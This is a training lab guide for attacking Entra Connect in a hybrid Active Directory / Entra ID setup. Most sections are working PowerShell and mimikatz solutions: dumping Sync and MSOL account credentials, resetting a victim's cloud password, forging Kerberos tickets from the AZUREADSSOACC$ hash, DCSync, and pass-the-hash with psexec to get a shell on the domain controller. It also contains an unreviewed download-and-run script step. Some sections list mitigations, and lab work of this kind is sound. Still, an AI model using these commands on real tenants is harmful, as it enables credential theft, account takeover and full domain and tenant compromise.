# Lab 2 - Entra Connect Attacks
### Preparations
#### Prepare a victim user with high privileges:
in [Entra porta](https://entra.microsoft.com/#view/Microsoft_AAD_UsersAndTenants/UserManagementMenuBlade/~/AllUsers/menuId/) (login with your admin tenant creds), select ***user2*** and assign him with the **Active** (not *Eligible*) **Application Administrator** role


# Instructions
-  From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM), and you know the Entra tenant domain.
- Once done for the day, go to **WRAP UP** section below before logging out / stopping the VMs
- Don't go so fast for the solution.. **try first!**

# Start 

### 1. Reconnaissance
Using AADInternals, do a bit of recon to find out the the tenant ID, and if the tenant has Seamless SSO turned on..

Hint: use https://aadinternals.com/aadinternals

<details>
<summary><b>Solution</b></summary>

```powershell
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
```
</details>


### 2. Dumping and Extracting Entra Connect credentials:
Now that you've got basic info, get the credentials of the Sync and MSOL accounts.

<details>
<summary><b>Solution</b></summary>

Execute in powershell:

```powershell
Get-AADIntSyncCredentials
```
keep the creds aside :)
</details>

### 3. Exploring the Tenant for High-Value Targets
In this lab, the goal is to identify synced users in the Azure AD tenant who have powerful roles or permissions. This information helps in lateral movement to the cloud and taking over high-value accounts. By leveraging the credentials of the dumped Sync_xx account and using Azure AD PowerShell or AADInternals, the attacker explores synced accounts in the tenant.

So far you've obtained:
1. Tenant ID + domain
2. Sync_xx account credentials

In order to move laterally to the cloud, we should find a synced user that we can take over...


<details>
<summary><b>Hint 1</b></summary>

See which users are Active Directory users that are synced to the cloud...
</details>

<details>
<summary><b>Hint 2</b></summary>

Go the easier way:
* Use AzureAD Powershell module (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)

Go the advanced way (and learn how to use access tokens):
1. Use AADInternals to get an access token for AAD Graph
2. Use AzureAD Powershell module and connect using this token (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)


</details>

<details>
<summary><b>Hint 3</b></summary>

Advanced way commands:
1. ```Get-AADIntAccessTokenForAADGraph```
1. ```Connect-AzureAD -AccountId $SyncUserUPN -TenantId $tenantId -AadAccessToken $at```

if you went the easy way - figure it out yourself.
</details>

<details>
<summary><b>Hint 4</b></summary>

Using AzureAD Powershell module, list the users, and try to see which one has a powerful role..
</details>


<details>
<summary><b>Solution</b></summary>

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph

# method 1: 
$userUPN = "Sync_xxx@YOURDOMAIN.onmicrosoft.com" # change the username
Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at

# method 2:
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id,
```

Enumerate users:
```powershell
# this is just a fancy, oneliner script to list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize
```

Did you find it? should be ```user1 & user2```.
</details>


### 4. Reset Password Attack
#### Reset the victim user's Entra password

In this scenario, the attacker resets the victim user's Entra (Azure Active Directory) password. By doing so, the attacker gains unauthorized access to the victim's account, allowing them to perform actions on behalf of the victim.

Attack Workflow
- Identify the Target: The attacker identifies the victim user whose password they want to reset.
- Obtain Access Token: The attacker obtains an access token with sufficient privileges to reset the user's password. This can be done through various means, such as phishing or exploiting vulnerabilities.
- Use AADInternals: The attacker uses the AADInternals tool, a PowerShell module for managing Azure AD, to reset the user's password.
- Execute Command: The attacker executes a command with the appropriate parameters to reset the password.
- Login as Victim: The attacker logs in to the Entra portal using the victim's account with the new password, in an incognito browser session to avoid detection.

<details>
<summary><b>Hint 1</b></summary>

Using AADInternals, reset that user's password and then login on its behalf.
</details>

<details>
<summary><b>Hint 2</b></summary>

Use Set-AADIntUserPassword command
</details>

<details>
<summary><b>Solution</b></summary>

```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -AccessToken $at -Verbose 
```
Now, open https://entra.microsoft.com in the browser **in incognito** and login as that user *VICTIM_USER@YOURDOMAIN.onmicrosoft.com* with the new password :)

#### Possible Mitigations
- Enable Multi-Factor Authentication (MFA): Require MFA for all users, which adds an extra layer of security beyond just the password.
- Monitor Access Logs: Regularly review access and audit logs to detect any unusual or unauthorized activities.
- Use Conditional Access Policies: Implement conditional access policies to control access based on conditions such as location, device compliance, and user risk.
- Limit Privileges: Ensure that only authorized personnel have privileges to reset passwords and access sensitive information.
- Security Awareness Training: Educate users about phishing and other social engineering attacks to reduce the risk of credential compromise.
- Use Strong Password Policies: Enforce strong password policies, including complexity requirements and regular password changes.
- By implementing these mitigations, organizations can reduce the risk of unauthorized password resets and protect their users' accounts.

#
# Finished? Reset the password back to the original one
#
</details>

#
### 5. Silver Ticket (Seamless SSO) Attack
* this method does not bypass MFA (as Kerberos ticket is a replacement for only the first factor (password))

Set the domain:
```powershell
$domain = "MYDOMAIN" # change to your domain name WITHOUT the ".onmicrosoft.com" part 
```

#### 1. Get AZUREADSSOACC computer account's hash:
```powershell
# Option 1: Get-ADReplAccount
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain $domain -Server dcvm # take the "NTHash" part

# Option 2: mimikatz
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$"
    
# Option 3: Dump NTDS.dit and registry:
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q # Now the AD and registry are dumped to C:\temp and we can extract the password hash using DSInternals.
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hex # Get the password's hash of AZUREADSSOACC
# remote the empty spaces and keep the hash
```

Set the hash:
```powershell
$hash = "CHANGEME"
```
#### 2. Find victim user's SID to impersonate

```powershell
# Option 1: query Entra + get roles
Import-Module AzureAD
Connect-AzureAD # use the dumped Entra Connect creds (Sync_XXX account)
Get-AzureADUser -All $true | Where-Object {$_.OnPremisesSecurityIdentifier -ne $null} | Select-Object OnPremisesSecurityIdentifier, UserPrincipalName

# Option 2: query AD (w/o getting Entra roles) - change VICTIM_USER_NAME to the target user
Get-ADReplAccount -SamAccountName 'VICTIM_USER_NAME' -Domain $domain -Server dcvm # take the "Sid:" part
```

Set the victim user's SID:
```powershell
$victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to impersonate
```

#### 3. Perform the attack
```powershell
# generate kerberos ticket
$kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash

# get an access token for that user
$at = Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
# if you get AADSTS50076 error, it means the user has MFA, try another user (user 5 for example)
# if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant

# start exploring what you can do in the tenant using MS Graph API!
$MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
Import-Module Microsoft.Graph.Users
$securedAT = ConvertTo-SecureString $at -AsPlainText -Force
Connect-MgGraph -AccessToken $securedAT

Get-MgContext

Get-MgUser
#SDK Docs: https://aka.ms/graph/sdk/powershell/docs
```

#### Key Takeaways
Attack Focus: Exploit the AZUREADSSOACC$ account's Kerberos capabilities to forge tickets and impersonate users in a hybrid Azure AD environment.
MFA Limitation: This attack bypasses password authentication but does not bypass MFA if enforced.
Potential Impact: Full control of Azure AD and its resources, depending on the permissions of the impersonated user.

*This method does not bypass MFA
#### Mitigation Strategies
Protect the AZUREADSSOACC$ Account:
- Restrict replication permissions to limit hash extraction via DCSync.
- Regularly rotate the account’s password.
- Monitor for Suspicious Activity:

Detect unusual Kerberos ticket generation or access patterns.
Audit AD replication and access requests.
Enforce Conditional Access:
Block access to sensitive resources unless all factors of authentication are verified.
Limit Privileges:
Ensure the AZUREADSSOACC$ account has the minimum required permissions.
Use separate privileged accounts for administration.


#
### 6. Pass The Hash using Entra Connect's MSOL Account Attack

Your goal: **using the already-obtained MSOL account creds**, perform pass the hash attack, and open cmd.exe on DC VM, using another domain admin user (that is *not* ``user1``). Do it from **Win 11 VM**.

* Use ``c:\lab\mimikatz`` and [impacket-psexec](https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe)

<details>
<summary><b>Solution</b></summary>


- On the Win11 VM [enable Active Directory feature](https://4sysops.com/archives/how-to-install-the-powershell-active-directory-module/#rtoc-5) so the ActiveDirectory PowerShell module will be installed

```powershell
Import-Module ActiveDirectory
# find a domain admin user to target
Get-ADGroupMember 'domain admins' | select name,samaccountname

# login in the context of MSOL account
runas /user:YOUDOMAIN\MSOL_xxxxxx cmd.exe

# in the newly opened cmd (running in the context of MSOL user) dump rootuser's hash (rootuser is a domain admin)
C:\lab\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:rootuser"

# from a new cmd:

.\psexec_windows.exe -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> YOUDOMAIN/rootuser@10.0.0.10 cmd

ipconfig # see the IP is of DC VM

```

#### Mitigation Strategies
To defend against this type of attack:

Limit Privileges:

Restrict the MSOL account's permissions using the principle of least privilege.
Use managed identities in Azure AD Connect to eliminate the MSOL account altogether.
Monitor Sensitive Operations:

Detect and alert on DCSync-like behaviors and NTLM hash usage.
Use tools like Azure AD Identity Protection or SIEM solutions.
Secure NTLM Authentication:

Disable NTLM where possible or enforce strong network authentication policies.
Deploy LSA protection to prevent credential dumping.
Apply Conditional Access Policies:

Enforce MFA and restrict logins to sensitive accounts.
Regular Patching:

Ensure all systems and tools like Entra Connect are updated to the latest version to prevent known vulnerabilities.
</details>


### 7. Tenant Takeover Challenge (Bonus, for really advanced students)
In this last exercise, your goal is to takeover the entire tenant, by getting the 'Global Administrator' role over a compromised user.

#### Preparations
- in [Entra porta](https://entra.microsoft.com/#view/Microsoft_AAD_UsersAndTenants/UserManagementMenuBlade/~/AllUsers/menuId/) (login with your admin tenant creds), select ***user1*** and assign him with the **Active** (not *Eligible*) **Application Administrator** role

- Execute the following powershell from dcVm, and authenticate using your **Entra admin credentials**.
- **DO NOT look into the script** as it will reveal the solution.


    ```powershell 
    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force

    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-2-entra-connect-attacks/lab-2-last-exc-prepartions.ps1" -OutFile "C:\\prepareLab2LastExc.ps1"; `
    & "C:\\prepareLab2LastExc.ps1" `
    -DomainName YOURDOMAIN.onmicrosoft.com -OwnerUsername user3 # the one listed here https://admin.microsoft.com/#/Domains
    ```

- From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM), and you know the Entra tenant domain.

<details>
<summary><b>Solution</b></summary>

**Once you're done, remove any role / permissions you've granted along the way.**

There's an app named "My backup app"
1. ```user3``` is an Owner of that app, which means he can add secrets to it
1. authenticate as that user (after you've compromised it using the Sync__xx account)
1. create a new secret for that app or its service principal
1. use that secret to authenticate as that app
1. the app has privileged permissions, use them to grant your user (or a new user) the global admin role
</details>

#


## WRAP UP
1. MAKE SURE YOU'VE RESET THE PASSWORD **BACK TO THE ORIGINAL ONE!** (Exercise 4)
2. Force Entra Conncet sync by running on **dcVm**:
    ```powershell
    Import-Module ADSync
    Start-ADSyncSyncCycle -PolicyType Initial
    Get-ADSyncConnectorRunStatus # wait for it to finish (should return empty result)
    ```
3. Now you can logout / stop the VMs

###  Good Job! Summarize the attack paths you just took and the attacks you've learned!
